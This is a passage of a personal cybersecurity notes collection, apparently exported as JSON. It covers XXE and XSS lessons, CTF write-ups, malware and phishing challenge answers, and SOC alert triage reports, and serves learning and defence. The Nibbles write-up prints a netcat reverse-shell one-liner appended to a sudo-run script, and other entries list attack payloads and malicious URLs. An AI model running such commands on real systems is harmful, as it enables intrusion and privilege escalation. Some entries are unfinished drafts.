of the most effective ways to prevent XXE attacks is to disable the processing of external entities in the XML parser configuration. This can be done by setting the appropriate parser configuration or using a secure XML parser that has external entity processing disabled by default.\nInput validation and sanitization: Always validate and sanitize all XML input before parsing it. This includes checking for malicious input such as nested XML entities, XML injections, and other forms of malicious input.\nUse secure parsers: Use the latest version of a secure XML parser that has been specifically designed to prevent XXE attacks. These parsers have features that can help detect and prevent XXE attacks.\nUse whitelist filtering: Implementing a whitelist of allowed entities and DTDs can help reduce the risk of XXE attacks by blocking any input that is not on the whitelist.\nImplement access controls: Implement proper access controls to restrict access to sensitive data and resources. This can help limit the damage in case an XXE vulnerability is exploited.\nUse secure coding practices: Use secure coding practices, such as input validation, data sanitization, and error handling, to minimize the risk of XXE attacks.\nBy implementing these best practices, you can significantly reduce the risk of XXE attacks in your web application. It is important to keep up-to-date with the latest security best practices and patches for your web application, and to periodically perform security assessments to identify and remediate any vulnerabilities.\nHere’s an example of vulnerable PHP code that is susceptible to XML External Entity attacks:\n\nThe code above loads an XML input from the php://input stream and passes it directly to the loadXML() method of the DOMDocument class without any validation or sanitization. This makes it vulnerable to XXE attacks.\nTo fix this vulnerability, we need to validate and sanitize the XML input and disable external entities. Here is an example of a fixed version of the code:\n\nIn the code above, we have disabled external entities using the function libxml_disable_entity_loader(), which prevents XXE attacks. We have then validated and sanitized the XML input using a regular expression that only allows alphanumeric and underscore characters. If the input passes validation, we load it into the DOMDocument object and output the sanitized XML. If the input fails validation, we output an error message.\nThis fixed code ensures that the XML input is properly validated, sanitized, and processed securely, and is much less vulnerable to XXE attacks.\nDetecting XML External Entity Attacks\nIn Part 1, we have overviewed what the XML External Entity is and how to prevent this vulnerability. In this part, we’ll have a look at the detection techniques and some tips to make it easier. Before moving on let’s take a quick look for example payloads for the XML External Entity vulnerability;\nBasic XXE Payload\n\nBlind XXE Payload\n\nXXE Payload with PHP Filter\n\nHere’s an example of what an Nginx log might look like when an XXE attack occurs via a vulnerable parameter on a GET request (This methodology is the same as analyzing POST requests):\n\nIn this log, the IP address of the client making the request is 123.45.67.89. The request was a GET request to the processXML endpoint, with an xml parameter that contains an XXE payload. The XXE payload attempts to read the contents of the /etc/passwd file. The response code is 200, indicating that the request was successful, and the response size is 143 bytes. The user agent string indicates that the request was made from a Chrome browser on a Windows 10 machine.\n\nThe most important things to detect XXE attacks on the logs, you should check specific keyword like;\n\nDOCTYPE\nELEMENT\nENTITY\n\nSo for the detecting !DOCTYPE keyword in nginx logs, we can use regex like;\n^(\\S+) - (\\S+) [(.?)] ”(\\S+) (.?)?(?=.?\\b21DOCTYPE\\b).? HTTP/\\d.\\d” (\\d+) (\\d+) ”(.?)” ”(.?)”\n\n21 is for the encoded version of the ! character. Because !DOCTYPE is equal to %21DOCTYPE. This regex will match the following line on the example that we have shared above;\n\nAnd decoded versions are;\n\nSo, it can be clearly seen that the user sends to XXE payload from source IP 123.45.67.89 on dates 30/Apr/2023:12:34:57 and 30/Apr/2023:12:34:59."},"SOC/XSS-Attack":{"slug":"SOC/XSS-Attack","filePath":"SOC/XSS Attack.md","title":"XSS Attack","links":["SOC/OWASP"],"tags":[],"content":"What is Cross-Site Scripting (XSS)?\nCross-site scripting (XSS) is a type of injection-based web security vulnerability that can be incorporated into legitimate web applications, allowing malicious code to be executed.\n\nToday, most frameworks used to develop web applications have taken preventative measures against cross-site scripting attacks. However, we still see XSS vulnerabilities today because frameworks are sometimes not used, or the framework itself has an XSS vulnerability and the data coming from the user is not sanitized.\nTypes of XSS\nThere are 3 types of XSS. These are:\n\n\nReflected XSS (Non-Persistent): This is a non-persistent type of XSS where the XSS payload must be present in the request. It is the most common type of XSS.\n\n\nStored XSS (Persistent): This type of XSS is where the attacker can permanently upload the XSS payload to the web application. Compared to other types, Stored XSS is the most dangerous type of XSS.\n\n\nDOM Based XSS: DOM Based XSS is an XSS attack where the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client-side script so that the client-side code runs in an “unexpected” manner. (OWASP)\n\n\nHow does XSS work?\nLike other web attack methods, XSS is a vulnerability that is caused by a lack of data sanitization. It occurs when the data received from the user is sent in the response without being sanitized.\nLet’s look at an example to understand XSS attacks better.\n\nFirst, we’ll examine the piece of code above. What it does is actually quite simple. It simply displays whatever is entered in the ‘user’ parameter. If we enter “LetsDefend” as the ‘user’ parameter, we will see the words “Hello LetsDefend”.\n\nSo far there is no problem. If we enter the appropriate data in the user parameter, we are greeted with a warm welcome. But, as we have already seen, there is no control mechanism for the user parameter. This means that whatever we put in the “user” parameter will be included in the HTTP response we receive back.\nSo what would happen if we didn’t enter a normal value, but instead a payload that would trigger a popup?\nPayload: alert(1)\n\nBecause whatever is put in the ‘user’ parameter is included directly in the HTTP response, the javascript code we wrote worked and a pop-up window appeared on the screen.\nThis is exactly how XSS works. Because the value entered by the user is not validated, the attacker can enter any javascript code and get the result they want. Another question is, what if the attacker wants to redirect the user to a malicious site?\nPayload: window.location=’google.com’\nletsdefend.io/xss_example.php%3Cscript%3Ewindow.location=%27google.com%27%3C/script%3E\n\nOf course we are not going to direct you to a web application. Directing you to Google will be sufficient as an example. When the user clicks on the URL he will be directed to Google instead of the perfect LetsDefend web application. \n\nHow Attackers Take Advantage of XSS Attacks\nBecause XSS is a client-based attack method, it may seem less important than other attack methods, but XSS attacks and their impact should not be taken for granted.\nAttackers can do the following with an XSS attack:\n\n\nSteal a user’s session information\n\n\nCapture credentials\n\n\nEtc.\n\n\nHow to Prevent a XSS Vulnerability\n\nSanitize data coming from a user: Never trust data that you receive from a user. If user data needs to be processed and stored, it should first be encoded with “HTML Encoding” using special characters, only then can it be stored.\nUse a framework: Most frameworks come with preventative measures against XSS attacks.\nUse the framework correctly: Almost all frameworks used to develop web applications come with a sanitation feature, but if this is not used properly, there is still a chance for XSS vulnerabilities to occur.\nKeep your framework up-to-date: Frameworks are developed by humans, so they too can contain XSS vulnerabilities. However, these types of vulnerabilities are usually patched with security updates. You should therefore make sure that you have completed the security updates for your framework on a regular basis.\n\nDetecting XSS Attacks\nAs XSS is one of the most commonly tested vulnerabilities.\n\nLook for keywords: The easiest way to detect XSS attacks is to look for keywords such as “alert” and “script” that are commonly used in XSS payloads.\nLearn about commonly used XSS payloads: Attackers tend to use the same payloads to look for vulnerabilities before exploiting an XSS vulnerability. Therefore, familiarizing yourself with commonly used XSS payloads would make it easier for you to detect XSS vulnerabilities. You can examine some commonly used payloads here.\nCheck for the use of special characters: Check data coming from a user to see if any special characters commonly used in XSS payloads, such as greater than (&gt;) or less than (&lt;), are present.\n\nAn Example of Detection\nIn this example, we have access logs from an Apache server running WordPress. Don’t forget to revisit our lesson “Detecting SQL injection attacks” for more information about access logs.\n\nLet’s examine the access logs provided.\nFirst, let’s take a general look at the requests that were made and try to understand them. We can see that all the requests were made for the “/blog/” page and that only the “s” parameter values were changed. If you pay attention to the URLs of the websites you visit, you probably have noticed before that when you perform a search in WordPress, the words you enter are sent with the “?s=” parameter. The example we are looking at shows us that these are searches carried out in WordPress.\nIt is difficult to find examples that are easy to read, such as the example in the lesson ” Detecting SQL Injection Attacks “. Instead, we usually come across characters that have been converted to %XX as a result of URL encoding. We’ll do URL decoding next, but first, let’s look at the URLs and see if we can spot any words.\nLooking at the logs, there are javascript-related words such as “script”, “prompt” and “console.log”. The word javascript immediately brings XSS to mind. If we decode the URL, we can easily understand the requests being made.\n\nLet’s take another look at the access logs after decoding the URLs. We can clearly see the XSS payloads and definitely conclude that the WordPress application from which we received these access logs has been the victim of an XSS attack.\nWhen we examine the requested IP addresses, we find that there is more than one. Is there more than one attacker trying to perform an XSS attack at the same time? Or is the attacker constantly changing their IP address to avoid being blocked by security products such as firewalls and IPS? If you check the IP address, you will see that it belongs to Cloudflare. Since WordPress has a partnership with Cloudflare, it is quite normal that Cloudflare would be the source of the request.\n\nNow, if we look at the dates of the requests, we see that a request was made every 3-4 seconds. It is not really possible for a human to try to enter that many XSS payloads in such a short time, but it still doesn’t mean you can be sure that the number of requests made per second is excessive. Because we have the user-agent information in this example, our job is easier. Once we check the information, we see that it belongs to a urllib library. This indicates that these requests were made by an automated vulnerability scanner tool.\nSo was the attack successful? \nWithout access to the responses, we cannot be sure.\nAs a result of our investigations:\n\nIt is clear that the attack was aimed at the web application where the access logs came from.\nLooking at the number of requests and the user agent information, we determined that the attack was carried out by an automated vulnerability scanner.\nAs the application is hosted behind Cloudflare, the source IP addresses were not found.\nWe do not know if the attack was successful or not.\n"},"SOC/fuzzy-hashing":{"slug":"SOC/fuzzy-hashing","filePath":"SOC/fuzzy hashing.md","title":"fuzzy hashing","links":[],"tags":[],"content":"Fuzzy hashing helps us to perform similarity analysis - match two files with minor differences based on the fuzzy hash values.\nOne of the examples of fuzzy hashing is the usage of SSDeep. SSDEEP creates a hash value that attempts to detect the level of similarity between two files at the binary level. This is different from a cryptographic hash (like SHA1) because a cryptographic hash can check exact matches (or non-matches)."},"Tools":{"slug":"Tools","filePath":"Tools.md","title":"Tools","links":[],"tags":[],"content":"Tools I use\n\nVirusTotal\nAbuseIPDB\nANY.RUN\nTalos Intelligence: Reputation Center\nHybrid Analysis\nCyberChef\nHashMyFiles \nQuickHash\n"},"Writeups/CTF/EncryptedScroll":{"slug":"Writeups/CTF/EncryptedScroll","filePath":"Writeups/CTF/EncryptedScroll.md","title":"EncryptedScroll","links":["Assets/cb2be1a3e6cd0db1431da1075bb84943_MD5.zip"],"tags":[],"content":"\n\nCyber Apocalypse CTF 2025 HTB\n\n\nAttachment:\n\n\ncb2be1a3e6cd0db1431da1075bb84943_MD5.zip\n\n\nReversing\n\n\nBackground\n\nElowen Moonsong, an Elven mage of great wisdom, has discovered an ancient scroll rumored to contain the location of The Dragon’s Heart. However, the scroll is enchanted with an old magical cipher, preventing Elowen from reading it.\n\nSolution\n\n\nUsing DIE to analyze the file, it appears to be a C program for Linux.\n\n\n\nAnalyzing strings, there is only this that makes sense.\n\n\n\nUsing Ghidra to decompile the file. Since its a C program it should be ez.\n\n\nThe main function is simple. Prints the text we saw earlier then takes input and passes it to the decrypt_message() function.\n\n\n\nThe decrypt_message() function appears to be where the input is validated. There is this IUC… string which is ran in a for loop and -1 is subtracted from each character, shifting the ASCII characters to left. This is a simple Ceasar cypher. We can decode it using cesar decoder online.\n\n\n\nThe decoded spell is HTB{s1mpl3_fl4g_4r1thm3t1c}\n\n"},"Writeups/CTF/EscapeTwo":{"slug":"Writeups/CTF/EscapeTwo","filePath":"Writeups/CTF/EscapeTwo.md","title":"EscapeTwo","links":[],"tags":[],"content":"Machine Info:\n- Easy\n- Windows\n- IP: 10.129.240.7\n- Incomplete\n\nSteps\n1. Reconnainsce\nNmap Scan\nCommand\nnmap -sV -oA EasyTwo-nmap 10.129.240.7 --open\nResult\nPORT     STATE SERVICE               VERSION\n53/tcp   open  domain                Simple DNS Plus\n88/tcp   open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-01-12 08:20:02Z)\n135/tcp  open  msrpc                 Microsoft Windows RPC\n139/tcp  open  netbios-ssn           Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n1433/tcp open  ms-sql-s              Microsoft SQL Server 2019 15.00.2000\n3269/tcp open  ssl/globalcatLDAPssl?\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows"},"Writeups/CTF/Impossimaze":{"slug":"Writeups/CTF/Impossimaze","filePath":"Writeups/CTF/Impossimaze.md","title":"Impossimaze","links":["Assets/0578cfa9ab216d7a5e18051b47bb92e7_MD5.zip"],"tags":[],"content":"\n\nCyber Apocalypse CTF 2025 HTB\n\n\nAttachment: Open: rev_impossimaze.zip\n\n\n0578cfa9ab216d7a5e18051b47bb92e7_MD5.zip\n\n\nReversing\n\n\nBackground\n\nElowen has been cursed to roam forever in an inescapable maze. You need to break her curse and set her free.\n\nSolution\n\n\nUsing DIE, it appears this is a Compiled C Program for Linux.\n\n\n\nThere are no strings to be found as expected.\n\n\nWe will need a linux environment to solve this.\n\n\nRunning the program, this appear where we can control X.\n\n\n"},"Writeups/CTF/Nibbles":{"slug":"Writeups/CTF/Nibbles","filePath":"Writeups/CTF/Nibbles.md","title":"Nibbles","links":["'app.hackthebox.com'","HTB/Nmap","HTB/ssh","HTB/Banner-grabbing","HTB/Gobuster","HTB/Metasploit","HTB/Reverse-Shell"],"tags":[],"content":"This is a retired machine, part of Getting Started Module of Hack The Box\nSteps Taken\nReconnaissance\nNmap Scan\nCommand\nnmap -sV -oA 01-04-2025-11-44-Nibbles-nmap 10.129.207.130 --open\nResult\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n \nConclusion\nThe host is running a apache server and is hosting a website and also has a ssh enabled and listening.\nBanner grabbing\nNo fruitful result obtained, got the same header as in nmap scan.\nVisiting the webpage\nThere is an interesting comment\n&lt;!--- /nibbleblog/ directory. Nothing interesting here! ---&gt;\nThere is nothing else on the webpage.\nGoing to the /nibbleblog directory\nThe website seems to be hosting a blog. We can note:\n\nThe blog seems to be ran using nibbleblog.\nThe website is using php.\nNothing else is there on the site\n\nEnumerating directories\nSince nothing much of our interest can be found I will enumerate directories using Gobuster. Couldn’t find anything with common.txt so using few other dictionaries to scan.\nMistake: Was enumerating the root url when I was supposed to enumerate the /nibbleblog. Found out after trying few wordlists and not finding any directories.\nCommand\ngobuster dir -u 10.129.207.130/nibbleblog -w /usr/share/wordlists/dirb/common.txt\nOutput\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.hta                 (Status: 403) [Size: 304]\n/.htaccess            (Status: 403) [Size: 309]\n/.htpasswd            (Status: 403) [Size: 309]\n/admin                (Status: 301) [Size: 327] [--&gt; http://10.129.207.130/nibbleblog/admin/]\n/admin.php            (Status: 200) [Size: 1401]\n/content              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/content/]\n/index.php            (Status: 200) [Size: 2987]\n/languages            (Status: 301) [Size: 331] [--&gt; http://10.129.207.130/nibbleblog/languages/]\n/plugins              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/plugins/]\n/README               (Status: 200) [Size: 4628]\nConclusion\nWe can see few directories:\n\n/admin.php\nAppears to be login page. Tried few login combo but immediately got blacklisted. Can’t bruteforce\n/admin\nContains file system with codes mostly .php and .bit. Couldn’t find anything useful.\n/content\nJackpot! Contains /private /public and /tmp folders. Looking into /private, it has lost of files including a users.xml file which showed that admin user existed and 2 blacklisted ips.\nOther directories had nothing useful to be found.\nSo far, we only know:\nadmin user exists but can’t login cuz blacklisted,\nWebsite uses nibbleblog.\n\nLooking for nibbleblog vulnerability\nA google search later, I found that nibbleblog has a severe file upload vulnerability. We can use Metasploit to take advantage of this vulnerability and summon a Reverse Shell. We need username and password for this vulnerability.\nDeadend: The vulnerability requires a user login creds. We have run out of reconnaissance. Lets go back and make sure nothing is left out. Rechecking the exposed files in /content, the word nibbles was repeated, in &lt;name&gt; tag and more importantly in email as admin@nibbles.com, on guessing nibbles as password, and we were successfully in. Now we could use the vulnerability.\nContinuing we successfully connect a Reverse Shell to the target. We can read the user.txt now.\nPrevilege Escalation\nHas no sudo,wget,curl. The answer has to be in the personal.zip file. Has no unzipcommand as well. Found out that I was using Metasploit’s meterpreter and it wasn’t actually the shell. So I had to run shell command to get to shell which wasn’t even tty shell. Now, the real deal was personal.zip file indeed. After unzipping it, I found that it had a backup script which the user could run as sudo. Then it was matter of appending it with a reverse shell. The shell was run as root which gave us root access.\necho &#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.18 8443 &gt;/tmp/f&#039; | tee -a monitor.sh\nThe first part is reverse shell, then tee -a to append it to monitor.sh which we can run as sudo."},"Writeups/CTF/SealedRune":{"slug":"Writeups/CTF/SealedRune","filePath":"Writeups/CTF/SealedRune.md","title":"SealedRune","links":["Assets/9b3a3ae385c610fc39705163a91b642a_MD5.zip"],"tags":[],"content":"\n\nHTB Cyber Apocalypse CTF 2025\n\n\nAttachment: 9b3a3ae385c610fc39705163a91b642a_MD5.zip\n\n\nReversing\n\n\nBackground\n\nElowen has reached the Ruins of Eldrath, where she finds a sealed rune stone glowing with ancient power. The rune is inscribed with a secret incantation that must be spoken to unlock the next step in her journey to find The Dragon’s Heart.\n\nSolution\n\n\nAnalyzing using DIE we find that its a Linux compiled C Program\n\n\n\nAnalyzing strings, there is a base64 encoded string.\n\n\n\nUsing cyberchef to decode it, it appears to be reversed, reversing it to get the final result as The secret spell is `HTB{run3_m4g1c_r3v34l3d}`.\n\nThat was the solution.\n"},"Writeups/Challenges/Malicious-VBA":{"slug":"Writeups/Challenges/Malicious-VBA","filePath":"Writeups/Challenges/Malicious VBA.md","title":"Malicious VBA","links":["Writeups/Challenges/invoice.vb","Writeups/Challenges/invoice_deobfuscated.vb"],"tags":[],"content":"Background\nOne of the employees has received a suspicious document attached in the invoice email. They sent you the file to investigate. You managed to extract some strings from the VBA Macro document. Can you refer to CyberChef and decode the suspicious strings?\nPlease, open the document in Notepad++ for security reasons unless you are running the file in an isolated sandbox.\nMalicious Macro: invoice.vb\nDeobfuscated file (by: ME): invoice_deobfuscated.vb\nQuestions\n\n\nThe document initiates the download of a payload after the execution, can you tell what website is hosting it?\n→ tinyurl.com/g2z2gh6f\n\n\nWhat is the filename of the payload (include the extension)?\n→ dropped.exe\n\n\nWhat method is it using to establish an HTTP connection between files on the malicious web server?\n→ MSXML2.ServerXMLHTTP\n\n\nWhat user-agent string is it using?\n→ Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\n\n\nWhat object does the attacker use to be able to read or write text and binary files?\n→ ADODB.Stream\n\n\nWhat is the object the attacker uses for WMI execution? Possibly they are using this to hide the suspicious application running in the background.\n→ winmgmts:\\.\\root\\cimv2:Win32_Process\n\n\nSolution\nFirst step is to deobfuscate the file. Took shit ton of time to and decoded all the strings. They are just put as ascii codes which need to be converted into char and concatinated. Once strings are decoded, the functions are pretty self-explanatory. I have attached the deobfuscated file at the top. After obfuscaton, the answers are right infront of us."},"Writeups/Challenges/Phishing-Email":{"slug":"Writeups/Challenges/Phishing-Email","filePath":"Writeups/Challenges/Phishing Email.md","title":"Phishing Email","links":[],"tags":[],"content":"About\nYour email address has been leaked and you receive an email from Paypal in German. Try to analyze the suspicious email.\nFile location: C:\\Users\\LetsDefend\\Desktop\\Files\\PhishingChallenge.zip\nPassword: infected\nQuestions\n\n\nWhat is the return path of the email?\n→ bounce@rjttznyzjjzydnillquh.designclub.uk.com\n\n\nWhat is the domain name of the url in this mail?\n→ storage.googleapis.com\n\n\nIs the domain mentioned in the previous question suspicious?\n→ yes\n\n\nWhat is the body SHA-256 of the domain?\n→ 13945ecc33afee74ac7f72e1d5bb73050894356c4bf63d02a1a53e76830567f5\n\n\nIs this email a phishing email?\n→ Yes\n\n\nAnalysis\nThe file contained the copy of email which was sent to us. Viewing the source of email, we can uncover some of the answers such as the return path. The email has a button which leads to google storage api. Paypal would not use google storage api. The url is as sus as the email itself is but at least its not some shady website url. Opening the url in browser, it is getting blocked.\nAnalyzing the url, in virustotal, 1 vendors flag as malicious and has -171 community score. We can note the SHA-256 of the domain and conclude that this is a harmful phishing attempt."},"Writeups/Drafts/Loggy":{"slug":"Writeups/Drafts/Loggy","filePath":"Writeups/Drafts/Loggy.md","title":"Loggy","links":["tags/htb","tags/malware-analysis"],"tags":["htb","malware-analysis"],"content":"htb malware-analysis\nHTB Easy Sherlock\n\nChallenge: app.hackthebox.com/sherlocks/Loggy\nAttachments:\n\nURL:challenges-cdn.hackthebox.com/sherlocks/easy/Loggy.zip\nPassword: hacktheblue\n\n\nBackground:\n\nJanice from accounting is beside herself! She was contacted by the SOC to tell her that her work credentials were found on the dark web by the threat intel team. We managed to recover some files from her machine and sent them to the our REM analyst.\n\n\n\nWalkthrough\n\n\nAfter extracting all of the files, we can use Hash my files tool to find the SHA-256 hash of the binary.\n\n\nLets use DIE (Detect it easy) tool to analyze the .exe file. We can see that the file is PE64 executable and the language it was written in was GO.\n\n\n\nThe next question asks us for github repo used for data exfiltration. We we have to filter out all of “github” strings from the binary and analyze them. We can use strings tool for windows to do this.\n\n\n\nWe can now go through the repos and see if any suspicious repo is present. We can see that a repo related to ftp is referenced. This is probably the one used for data exfiltration.\n\n\nThere is other repo about screenshot. This probably means that the malware takes screenshot of the device. This also answers our question.\n\n\nLets decompile the malware to reveal further details about it. We can use Ghidra to do this. Opening the executable in Code Browser in Ghidra,\n\n\nSolution\n\n\nWhat is the SHA-256 hash of this malware binary?\n= 6acd8a362def62034cbd011e6632ba5120196e2011c83dc6045fcb28b590457c\n\n\nWhat programming language (and version) is this malware written in?\n= GO1.22.3\n\n\nThere are multiple GitHub repos referenced in the static strings. Which GitHub repo would be most likely suggest the ability of this malware to exfiltrate data?\n= github.com/jlaffaye/ftp\n\n\nWhat dependency, expressed as a GitHub repo, supports Janice’s assertion that she thought she downloaded something that can just take screenshots?\n= github.com/kbinani/screenshot\n\n\nWhich function call suggests that the malware produces a file after execution?\n=\n\n\nYou observe that the malware is exfiltrating data over FTP. What is the domain it is exfiltrating data to?\n=\n\n\nWhat are the threat actor’s credentials?\n=\n\n\nWhat file keeps getting written to disk?\n=\n\n\nWhen Janice changed her password, this was captured in a file. What is Janice’s username and password?\n=\n\n\nWhat app did Janice have open the last time she ran the “screenshot app”?\n=\n\n"},"Writeups/SOC-Alerts/SOC104-1":{"slug":"Writeups/SOC-Alerts/SOC104-1","filePath":"Writeups/SOC Alerts/SOC104 1.md","title":"SOC104 1","links":[],"tags":[],"content":"Alert\n\nEventID: 36\nEvent Time: Dec, 01, 2020, 10:23 AM\nRule: SOC104 - Malware Detected\nLevel: Security Analyst\nSource Address: 10.15.15.18\nSource Hostname: AdamPRD\nFile Name: Invoice.exe\nFile Hash: f83fb9ce6a83da58b20685c1d7e1e546\nFile Size: 473.00 KB\nDevice Action: Allowed\nFile (Password:infected): Download\n\nAnalysis\nMalware Analysis\nThe file was a zip file which was immediately blocked by chrome. After download, it  was ran through virustotal &amp; Anyrun whose report are:\nVirustotal\n\nURL: www.virustotal.com/gui/file/77b2731ff3c7a14b8b962ea387c41293415b3478e73973888851991105777560\nResult: 7 vendors flagged it as trojan. The bundled file was  Maze.exe(e8a091a84dd2ea7ee429135ff48e9f48f7787637ccb79f6c3eb42f34588bc684)\n\nAnyRun\nURL:app.any.run/tasks/83f446df-c888-44b7-9db7-330211161c69\nThe file was a Ransomware. It immediately started modifying files in appdata. It sent tcp connection to 92.63.8.47 ip address only. Running the ip address through abuseipdb, it has been associated with maze ransomware.\nC2 Access\nChecking if the C2 server was accessed through logs. Unfortunately, there is an entry of the C2 server in logs. It was accessed by 10.15.15.18 which belongs to our victim system few minutes after the file was downloaded. This means our endpoint has been compromised but the malicious file has not yet spread.\nEndpoint\nThe endpoint has been contained.\nConclusion\nThe alert is truepositive. The malicious file was a ransomware and the endpoint is infected. Logs indicated that the C2 server was accessed by the victim host only so the malware has not yet propagated through the network. The host has been contained and needs further action."},"Writeups/SOC-Alerts/SOC104-2":{"slug":"Writeups/SOC-Alerts/SOC104-2","filePath":"Writeups/SOC Alerts/SOC104 2.md","title":"SOC104 2","links":[],"tags":[],"content":"Alert\n\nEventID: 84\nEvent Time: Mar, 21, 2021, 01:04 PM\nRule: SOC104 - Malware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.5\nSource Hostname: SusieHost\nFile Name: winrar600.exe\nFile Hash: c74862e16bcc2b0e02cadb7ab14e3cd6\nFile Size: 2.95 Mb\nDevice Action: Allowed\nFile (Password: infected): Download\n\nAnalysis\nMalware Analysis\nThe file was a zip file which was immediately blocked by chrome. After download, it  was ran through virustotal &amp; Anyrun whose report are:\nVirustotal\n\nURL: www.virustotal.com/gui/file/aff4bb9b15bccff67a112a7857d28d3f2f436e2e42f11be14930fe496269d573/detection\nResult:\n\nSAFE\nOnly 1 vendor flagged it as malicious\nNo malicious domains\nValid signature\nAuthentic winrar executable\n\n\n\nAnyRun\n\nURL:app.any.run/tasks/0786f88e-c614-48c1-bc16-6270455ed826\nResult:\n\nDetects as 100/100 malicious.\nOn looking at indicators, they seem reasonable for the installer.\nThere are no malicious activities.\nThe detection system was thrown off likely because of nature of executable.\n\n\n\nEndpoint\nNothing sus.\nConclusion\nThe executable is SAFE and this is a falsepositive."},"Writeups/SOC-Alerts/SOC104":{"slug":"Writeups/SOC-Alerts/SOC104","filePath":"Writeups/SOC Alerts/SOC104.md","title":"SOC104","links":[],"tags":[],"content":"ALERT\n\nEventID: 14\nEvent Time: Sep, 15, 2020, 09:02 PM\nRule: SOC104 - Malware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.82\nSource Hostname: JohnComputer\nFile Name: googleupdate.exe\nFile Hash: 0bca3f16dd527b4150648ec1e36cb22a\nFile Size: 152.45 KB\nDevice Action: Allowed\nFile (Password:infected): Download\n\nAnalysis\n\nVirustotal: Clean\nAnyrun: Clean\n\nResult\nThe alert is false positive and was caused by download of google update. The file was scanned in virustotal and ran through anyrun and both platforms confirmed that it was not malicious. No further action is required."},"Writeups/SOC-Alerts/SOC109":{"slug":"Writeups/SOC-Alerts/SOC109","filePath":"Writeups/SOC Alerts/SOC109.md","title":"SOC109","links":[],"tags":[],"content":"Alert\n\nEventID: 85\nEvent Time: Mar, 22, 2021, 09:06 PM\nRule: SOC109 - Emotet Malware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.45\nSource Hostname: RichardPRD\nFile Name: 1word.doc\nFile Hash: 349d13ca99ab03869548d75b99e5a1d0\nFile Size: 188.95 Kb\nDevice Action: Cleaned\nFile (Password:infected): Download\n\nAnalysis\nThe file was extracted and ran through virustotal &amp; anyrun:\nMalware Analysis\n1. Virustotal\n\nURL: www.virustotal.com/gui/file/d34849e1c97f9e615b3a9b800ca1f11ed04a92b1014f55aa0158e3fffc22d78f\nReport:\n\nMalicious 48 vendors reported\nUses macro to drop malware into the system\n\n\n\n2. Anyrun\n\nURL: app.any.run/tasks/80495aaf-6841-40c7-846e-481546ca8299\nReport:\n\nMalicious urls:\n\ngrml.net (85.214.109.143)\ngetming.com (168.206.6.156)\nevilnerd.org (81.169.145.160)\n\n\n100/100 Malicious score\nDrops Malware\n\n\n\nLog Analysis\nThere is no record of host accessing any of the malicious urls found during malware analysis. We can hence conclude that the malware was not executed.\nReport\nThe file “1word.doc” was confirmed to be malicious, utilizing macros to drop malware into the system. Multiple security vendors identified the file as a threat. However, the analysis revealed that the host did not access any of the malicious URLs associated with the malware, indicating that the malware was not executed. The threat has been neutralized, and the device action successfully cleaned it."},"Writeups/SOC-Alerts/SOC114":{"slug":"Writeups/SOC-Alerts/SOC114","filePath":"Writeups/SOC Alerts/SOC114.md","title":"SOC114","links":[],"tags":[],"content":"Alert\n\nEventID : 45\nEvent Time : Jan, 31, 2021, 03:48 PM\nRule : SOC114 - Malicious Attachment Detected - Phishing Alert\nLevel : Security Analyst\nSMTP Address : 49.234.43.39\nSource Address : accounting@cmail.carleton.ca\nDestination Address : richard@letsdefend.io\nE-mail Subject : Invoice\nDevice Action : Allowed\n\nAction\nAttachment\nc9ad9506bcccfaa987ff9fc11b91698d was present is the email whose password was infected. In Virustotal 34/60 vendors flagged it as trojan. The file contained an spreadsheet.\nWas it opened?\nThe email is harmful and was successfully delivered. Deleted it immediately.\nChecking logs of that day, right after email was delivered following url was invoked andaluciabeach.net/image/network.exe which is fagged as malicious by 13 vendors in virustotal. The host is now infected. On further investigation, there was juicypotato.exe running on the host. The host was contained immediately."},"Writeups/SOC-Alerts/SOC119":{"slug":"Writeups/SOC-Alerts/SOC119","filePath":"Writeups/SOC Alerts/SOC119.md","title":"SOC119","links":[],"tags":[],"content":"Alert\n\nEventID: 83\nEvent Time: Mar, 21, 2021, 01:02 PM\nRule: SOC119 - Proxy - Malicious Executable File Detected\nLevel: Security Analyst\nSource Address: 172.16.17.5\nSource Hostname: SusieHost\nDestination Address: 51.195.68.163\nDestination Hostname: win-rar.com\nUsername: Susie\nRequest URL: www.win-rar.com/postdownload.html\nUser Agent: Chrome - Windows\nDevice Action: Allowed\n\nAnalysis\nDestinaiton Host\nThe destinaiton win-rar.com is a legit website of winrar which serves the app downloads. Running ip through abuseipdp, the ip address belongs to the site and there is no spoofing.\nURL\nThe url drops an executable “WinRar.exe” (a911bbfab70c7545307b9dbcb06273d899ca03aad928f0b66d55b41c25cb4f14). Running the executable through Virustotal, the file is clean and is legit winrar installer.\nConclusion\nThe alert was triggered by a legitimate download of the WinRAR installer from the official website. The executable file is clean and safe, as confirmed by VirusTotal. No further action is required."},"Writeups/SOC-Alerts/SOC120":{"slug":"Writeups/SOC-Alerts/SOC120","filePath":"Writeups/SOC Alerts/SOC120.md","title":"SOC120","links":[],"tags":[],"content":"Alert\n\nEventID : 52\nEvent Time : Feb, 07, 2021, 04:24 AM\nRule : SOC120 - Phishing Mail Detected - Internal to Internal\nLevel : Security Analyst\nSMTP Address : 172.16.20.3\nSource Address : john@letsdefend.io\nDestination Address : susie@letsdefend.io\nE-mail Subject : Meeting\nDevice Action : Allowed\n\nAnalysis\nStuyding the 172.16.20.3, it happens to be Exchange Server in our network. There seems to be no trace of the Exchange Server getting hacked. This email might have been spoofed or sth.\nAnalyzing the email, the email seems legit, there is no attachments 